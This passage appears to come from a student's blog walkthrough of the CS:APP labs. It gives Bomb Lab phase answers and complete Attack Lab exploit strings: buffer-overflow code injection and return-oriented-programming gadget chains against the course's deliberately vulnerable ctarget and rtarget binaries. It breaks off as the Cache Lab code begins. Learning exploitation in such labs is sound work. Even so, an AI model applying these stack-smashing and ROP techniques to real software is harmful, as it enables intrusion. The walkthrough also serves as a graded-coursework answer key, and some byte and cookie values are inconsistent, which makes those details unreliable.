<li><code>%r8</code>: the fifth argument.</li>
<li><code>%r9</code>: the sixth argument.</li>
</ul>
<p>More arguments are stored in stack. Know at which positions these
arguments are stored in stack and you'll get the answer!</p>
<p><strong>Phase 3</strong></p>
<p>This function reads two integers and switches to the address
accroding to the first integer. If the destination address has a value
same as the second integer, the phase passes.</p>
<p>This phase has multiple answers. You can choose one of the
followings:</p>
<ul>
<li><code>0 207</code></li>
<li><code>1 311</code></li>
<li><code>2 707</code></li>
<li><code>3 256</code></li>
<li><code>4 389</code></li>
<li><code>5 206</code></li>
<li><code>6 682</code></li>
<li><code>7 327</code></li>
</ul>
<p><strong>Phase 4</strong></p>
<p>The key is to decode <code>func4(x, s, e)</code> and understand it
returns some numbers of steps to find <code>x</code> between
<code>[s, e]</code> using binary search. <code>s=0</code> and
<code>e=14</code>. The function returns <code>0</code> if it finds
<code>x</code> in the very first step. So <code>x=7</code>.</p>
<p><strong>Phase 5</strong></p>
<p>This phase executes the following steps:</p>
<ul>
<li>The answer string length is 6.</li>
<li>Reads a string from <code>0x4024b0</code> and compares it to the
string at <code>0x40245e</code>, which is <code>flyers</code>.</li>
<li>The string at <code>0x4024b0</code> is
<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code>.</li>
<li>The indices respectively for <code>f</code>, <code>l</code>,
<code>y</code>, <code>e</code>, <code>r</code>, <code>s</code> at
<code>0x4024b0</code> is 9, 15, 14, 5, 6, 7. The hex representations are
<code>9</code>, <code>f</code>, <code>e</code>, <code>5</code>,
<code>6</code>, <code>7</code>.</li>
<li>Find in the ASCII table those characters whose low hex
representation is <code>9</code>, <code>f</code>, <code>e</code>,
<code>5</code>, <code>6</code> and <code>7</code>. So there are multiple
possible answers.</li>
</ul>
<p><strong>Phase 6</strong></p>
<p>This is the most difficult phase (including the secret one), in terms
of it's length of assembly... Be patient and take a careful look at the
assembly. You'll find this phase does the following things:</p>
<ul>
<li>It reads six integers and stores them in stack from the bottom
up.</li>
<li>Each integer is different and all are smaller or equal than 6.</li>
<li>Subtracts each integer from 7. For example, 6 turns into 1.</li>
<li>According to the result integer, this function jumps to the target
address from <code>0x6032d0</code> and reads the value. This value is
also an address. The results are stored from <code>%rsp+32</code> to
<code>%rsp+72</code>, amounting to totally eight addresses.</li>
<li>Sets <code>*(*(%rsp+t)+8)=*(%rsp+t+8)</code>, where
<code>t=32, 3a, 42, ..., 6a</code>. For <code>t=72</code>, the target
value is zero.</li>
<li>It actually implements a linked list, likely implemented as follows:
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct node {</span><br><span class="line">  int value;</span><br><span class="line">  node* next;</span><br><span class="line">};</span><br></pre></td></tr></table></figure></li>
<li>This linked list has a list of non-ascending values.</li>
<li>Find the indices in a non-ascending order and restore the input
indices.</li>
</ul>
<p><strong>Secret Phase</strong></p>
<p>Disassembling the <code>phase_defused</code> function and you will
find a secret <code>secret_phase</code> function. This is the hidden
phase of this lab. The <code>secret_phase</code> function does:</p>
<ul>
<li>Receives an integer less or equal than 1001.</li>
<li>Calls function <code>fun7(int* s, int x)</code> and returns 2.</li>
<li>The <code>fun7(int* s, int x)</code> function receives a pointer
<code>s</code> to a binary search tree node and finds value
<code>x</code> in the tree.</li>
<li>Your goal is to find in this tree a value that returns 2, according
to the calculation rules.</li>
</ul>
<p>This binary search tree node looks like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">         36</span><br><span class="line">       /    \</span><br><span class="line">      /      \</span><br><span class="line">     /        \</span><br><span class="line">    8          50</span><br><span class="line">   / \       /    \</span><br><span class="line">  6   22    45    100</span><br><span class="line"> / \  / \   / \   / \</span><br><span class="line">1  7 20 35 40 47 99 1001</span><br></pre></td></tr></table></figure>
<h1 id="lab-3-attack-lab">Lab 3: Attack Lab</h1>
<p>This lab asks you to construct exploits to have the function output
specific strings. Before start, make sure to take a glance at the <a target="_blank" rel="noopener" href="https://csapp.cs.cmu.edu/3e/attacklab.pdf">handout</a>, which has
detailed instructions for this lab. Remember to use <code>-Og</code> to
compile the <code>.s</code> file and use <code>objdump -d</code> to
generate byte codes.</p>
<p><strong>Phase 1</strong></p>
<p>In the <code>getbuf()</code> function, <code>%rsp</code> has an
address of <code>0x5561dc78</code> and the return address is located at
<code>%rsp+0x28</code>, which is <code>0x5561dca0</code>. To call the
<code>touch1()</code> function, you should set the return address as the
address of <code>touch1()</code>, that is, <code>0x4017c0</code>.</p>
<p>The input to <code>ctarget</code> is thus:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>The first 40 bytes are arbitrary except <code>\n</code>.</p>
<p><strong>Phase 2</strong></p>
<p>In this phase, you should put <code>0x591997fa</code> into
<code>%rdi</code> and jump to <code>0x4017ec</code> to execute function
<code>touch2()</code>.</p>
<p>The first step is to write a <code>.s</code> file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>Then generate its byte codes:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 // movq $0x59b997fa, %rdi</span><br><span class="line">68 ec 17 40 00       // pushq $0x4017ec</span><br><span class="line">c0                   // ret</span><br></pre></td></tr></table></figure>
<p>Write the input exploit file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">31 32 33 34 35 36 37 38</span><br><span class="line">48 c7 c7 fa 97 b9 59 68  // Address 0x5561dc90, return here to execute instructions</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">90 dc 61 55 00 00 00 00  // Destination address</span><br></pre></td></tr></table></figure>
<p><strong>Phase 3</strong></p>
<p>Note that in this phase, the content in the stack may be overwritten
by function <code>hexmatch()</code>. So you must write the content in
some high location of the stack.</p>
<p>The assembly code is:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>The generated byte codes are:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55  // movq $0x5561dca8, %rdi</span><br><span class="line">68 fa 18 40 00        // pushq $0x4018fa</span><br><span class="line">c3                    // ret</span><br></pre></td></tr></table></figure>
<p>The input exploit is:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 // Address 0x5561dc78</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 // Destination address</span><br><span class="line">35 39 62 39 39 37 66 61 // Address 0x5561dca8, string "59b997fa"</span><br></pre></td></tr></table></figure>
<p><strong>Phase 4</strong></p>
<p>In this phase, you should construct two gadgets, one for moving data
<code>0x59b997fa</code> into some register like <code>%rax</code>, and
the other one for moving <code>%rax</code> to <code>%rdi</code> as the
argument into the function. Last, you should return to function
<code>touch2()</code>.</p>
<p>You can find a function which contains the desired byte codes and
returns to that location. The first gadget uses the function
<code>addval_219</code> and the second function is
<code>setval_426</code>. You can choose other functions if
applicable.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00  // Jump to middle of function addval_219 and perform pop</span><br><span class="line">fa 97 b9 59 00 00 00 00  // cookie value 0x59b997fa, popped to %rax </span><br><span class="line">c5 19 40 00 00 00 00 00  // Jump to middle of function setval_426 and perform mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00  // Return to touch2()</span><br></pre></td></tr></table></figure>
<p>Here is a full list of decoded byte codes for all functions in
<code>farm.c</code>. Use Ctrl+F to search the byte patterns you
want.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0x40199a: b8 fb 78 90 90 c3</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_142</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019a0: 8d 87 48 89 c7 c3 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_273</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019a7: 8d 87 51 73 58 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_219</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019ae: c7 07 48 89 c7 c7 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_237</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019b5: c7 07 54 c2 58 92 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_424</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019bc: c7 07 63 48 8d c7 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_470</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019c3: c7 07 48 89 c7 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_426</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019ca: b8 29 58 90 c3 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_280</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019d6: 48 8d 04 37 c3</span></span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">add_xy</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> y)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019db: b8 5c 89 c2 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_481</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019e1: c7 07 99 d1 90 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_296</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019e8: 8d 87 89 ce 78 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_113</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019ef: 8d 87 8d d1 20 db c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_490</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019f6: b8 89 d1 48 c0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_226</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x4019fc: c7 07 81 d1 84 c0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_384</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a03: 8d 87 41 48 89 e0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_190</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a0a: c7 07 88 c2 08 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_276</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a11: 8d 87 89 ce 90 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_436</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a18: b8 48 89 e0 c1 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_345</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a1e: 8d 87 89 c2 00 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_479</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a25: 8d 87 89 ce 38 c0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_187</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a2c: c7 07 81 ce 08 db c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_248</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a33: b8 89 d1 38 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_159</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a39: 8d 87 c8 89 e0 c3 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_110</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a40: 8d 87 89 c2 84 c0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_487</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a47: 8d 87 48 89 e0 c7 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_201</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a4e: b8 99 d1 08 d2 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_272</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a54: b8 89 c2 c4 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_155</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a5a: c7 07 48 89 e0 91 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_299</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a61: 8d 87 89 ce 92 c3 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_404</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a68: b8 89 d1 08 db c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_311</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a6e: c7 07 89 d1 91 c3 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_167</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a75: c7 07 81 c2 38 d2 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_328</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a7c: c7 07 09 ce 08 c9 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_450</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a83: 8d 87 08 89 e0 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_358</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a8a: 8d 87 89 c2 c7 3c c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_124</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a91: b8 88 ce 20 c0 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_169</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a97: c7 07 48 89 e0 c2 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_181</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401a9e: 8d 87 89 c2 60 d2 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">addval_184</span><span class="params">(<span class="type">unsigned</span> x)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401aa5: b8 8d ce 20 d2 c3</span></span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">getval_472</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 0x401aab: c7 07 48 89 e0 90 c3</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setval_350</span><span class="params">(<span class="type">unsigned</span> *p)</span></span></span><br></pre></td></tr></table></figure>
<p><strong>Phase 5</strong></p>
<p>Here is how you should think to solve this phase:</p>
<ul>
<li>Function <code>touch3(const char*)</code> receives an address as the
argument. So you should prepare an address value in
<code>%rdi</code>.</li>
<li>This address value should come from <code>%rsp</code>. An intuitive
way is use <code>mov %rsp, %rax</code>.</li>
<li>However, the cached <code>%rsp</code> value is not allowed to store
the string value because it will be immediately transmitted to
<code>PC</code> as the address of the next instruction. It must be a
valid address.</li>
<li><code>farm.c</code> provides a function
<code>add_xy(long, long)</code>. It can be leveraged to offset the value
of <code>%rsp</code>.</li>
<li>The returned value of <code>add_xy(long, long)</code> is the address
where the string is actually stored. It lies at the highest position of
our input.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00  // mov %rsp, %rax</span><br><span class="line">c5 19 40 00 00 00 00 00  // mov %rax, %rdi</span><br><span class="line">ab 19 40 00 00 00 00 00  // pop %rax (0x48 is the offset)</span><br><span class="line">48 00 00 00 00 00 00 00  // (popped offset)</span><br><span class="line">42 1a 40 00 00 00 00 00  // movl %eax, %edx</span><br><span class="line">69 1a 40 00 00 00 00 00  // movl %edx, %ecx</span><br><span class="line">27 1a 40 00 00 00 00 00  // movl %ecx, %esi</span><br><span class="line">d6 19 40 00 00 00 00 00  // call add_xy</span><br><span class="line">c5 19 40 00 00 00 00 00  // mov %rax, %rdi</span><br><span class="line">fa 18 40 00 00 00 00 00  // call touch3</span><br><span class="line">35 39 62 39 39 37 66 61  // string "59b997fa"</span><br></pre></td></tr></table></figure>
<h1 id="lab-4-cache-lab">Lab 4: Cache Lab</h1>
<p>Make sure you read the <a target="_blank" rel="noopener" href="https://csapp.cs.cmu.edu/3e/cachelab.pdf">handout</a> before dong
this lab.</p>
<p><strong>Part A</strong></p>
<p>Code for part A <code>csim.c</code>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span 